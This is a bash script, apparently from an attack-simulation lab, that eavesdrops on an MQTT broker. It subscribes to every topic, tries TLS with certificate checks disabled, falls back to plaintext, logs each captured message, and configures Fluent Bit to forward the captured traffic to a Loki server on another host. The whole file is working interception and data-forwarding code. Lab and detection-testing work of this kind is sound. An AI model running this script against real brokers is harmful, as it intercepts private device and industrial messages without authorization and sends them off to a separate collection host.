#!/bin/bash
# MQTT eavesdropping: subscribe to every topic on a broker with mosquitto_sub,
# append each message to a file, and let Fluent Bit tail that file and push each
# new message to Loki. Launched in the background by the attacker on Start Attack.
#
# Usage: mqtt-eavesdropping.sh <broker_addr> <broker_port> <subtopic> [loki_ip]

BROKER_ADDR="${1:-10.0.0.1}"
BROKER_PORT="${2:-1883}"
SUBTOPIC="${3:-#}"
LOKI_IP="${4:-10.1.0.254}"

STREAM_FILE="/root/mqtt_stream.log"
CONF_FILE="/etc/fluent-bit/mqtt.conf"

mkdir -p /var/lib/fluent-bit /etc/fluent-bit
: > "${STREAM_FILE}"
# Fresh tail position each run so we don't replay a stale offset DB.
rm -f /var/lib/fluent-bit/mqtt.db

tee "${CONF_FILE}" << __EOF__
[SERVICE]
    Flush        1
    Daemon       Off
    Log_Level    warning
    storage.path /var/lib/fluent-bit
    storage.sync normal

[INPUT]
    Name              tail
    Path              ${STREAM_FILE}
    Tag               mqtt.file
    DB                /var/lib/fluent-bit/mqtt.db
    Mem_Buf_Limit     5MB
    Skip_Long_Lines   On
    storage.type      filesystem
    Refresh_Interval  1
    Read_From_Head    On

[OUTPUT]
    Name          loki
    Match         mqtt.file
    Host          ${LOKI_IP}
    Port          3100
    Labels        job=mqtt,env=lab,host=${HOSTNAME},level=warning
    Line_Format   json

[OUTPUT]
    Name   stdout
    Match  mqtt.file
    Format json_lines
__EOF__

echo "[mqtt-eavesdropping] broker=${BROKER_ADDR}:${BROKER_PORT} topic=${SUBTOPIC} -> loki ${LOKI_IP}:3100"

# Fluent Bit tails the stream file (background).
fluent-bit -c "${CONF_FILE}" &

SUB_ARGS="-h ${BROKER_ADDR} -p ${BROKER_PORT} -t ${SUBTOPIC}"

# TLS fallback: when the broker sits behind the TLS termination proxy, subscribe
# over TLS (the proxy forwards SUBSCRIBE/PUBLISH to the broker); otherwise use
# plaintext MQTT for direct brokers.
if [ -f /rootCA.pem ] && timeout 8 mosquitto_sub --cafile /rootCA.pem --insecure ${SUB_ARGS} -C 1 -W 4 > /dev/null 2>&1; then
    echo "[mqtt-eavesdropping] broker accepts TLS, eavesdropping securely"
    # Subscribe and append every message to the stream file (keeps this script alive).
    exec mosquitto_sub --cafile /rootCA.pem --insecure ${SUB_ARGS} -v >> "${STREAM_FILE}"
fi

echo "[mqtt-eavesdropping] TLS not available, falling back to plaintext"
# Subscribe and append every message to the stream file (keeps this script alive).
exec mosquitto_sub ${SUB_ARGS} -v >> "${STREAM_FILE}"
